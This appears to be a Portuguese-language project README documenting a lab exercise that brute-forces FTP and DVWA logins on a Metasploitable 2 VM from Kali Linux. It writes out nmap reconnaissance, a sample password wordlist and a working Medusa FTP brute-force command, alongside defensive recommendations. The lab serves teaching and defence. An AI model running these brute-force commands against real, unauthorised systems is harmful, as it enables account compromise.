# Projeto-de-Seguran-a-Ataques-de-For-a-Bruta-com-Kali-Linux-Medusa
Este projeto tem como objetivo simular ataques de força bruta em um ambiente controlado, utilizando o Kali Linux como máquina atacante e o Metasploitable 2 como alvo vulnerável.  Foram realizados testes em diferentes serviços (FTP, aplicação web DVWA e SMB), com foco na compreensão das vulnerabilidades e aplicação de medidas de mitigação.
🎯 Objetivos de Aprendizagem
Compreender como funcionam ataques de força bruta;
Utilizar ferramentas como Medusa e Hydra;
Explorar vulnerabilidades em ambientes controlados;
Documentar processos técnicos de forma clara;
Propor medidas de segurança (visão Blue Team).

🧪 Ambiente de Laboratório
Componente	Descrição
Sistema atacante	Kali Linux
Sistema alvo	Metasploitable 2
Virtualização	VirtualBox
Rede	Host-only (isolada)

🌐 Configuração de Rede

Ambas as máquinas foram configuradas com:

Adaptador: Host-only
Comunicação interna entre Kali e Metasploitable
🔍 Descoberta de IP
netdiscover

Resultado exemplo:

192.168.56.101 → Metasploitable 2
🔐 Teste 1 – Ataque de Força Bruta em FTP
📌 Identificação do Serviço
nmap -p 21 192.168.56.101
📄 Criação de Wordlist
nano senhas.txt

Exemplo:

123456
admin
password
msfadmin
⚔️ Execução do Ataque
medusa -h 192.168.56.101 -u msfadmin -P senhas.txt -M ftp
✅ Resultado

O ataque foi bem-sucedido ao identificar as credenciais:

login: msfadmin
password: msfadmin
⚠️ Vulnerabilidade Identificada
Senha fraca
Ausência de bloqueio por tentativas
🌐 Teste 2 – Ataque em Aplicação Web (DVWA)
📌 Acesso à Aplicação
http://192.168.56.101/dvwa

Credenciais padrão:

admin / password

✅ Resultado

A ferramenta conseguiu identificar a senha correta utilizando força bruta.

⚠️ Vulnerabilidades
Ausência de CAPTCHA
Sem limitação de tentativas
Falta de autenticação multifator

📊 Conclusão

Este projeto permitiu compreender na prática como ataques de força bruta são realizados e como sistemas mal configurados podem ser facilmente comprometidos.

Além disso, reforçou a importância de boas práticas de segurança, especialmente no contexto de defesa (Blue Team), como monitoramento, políticas de senha e controle de acesso.
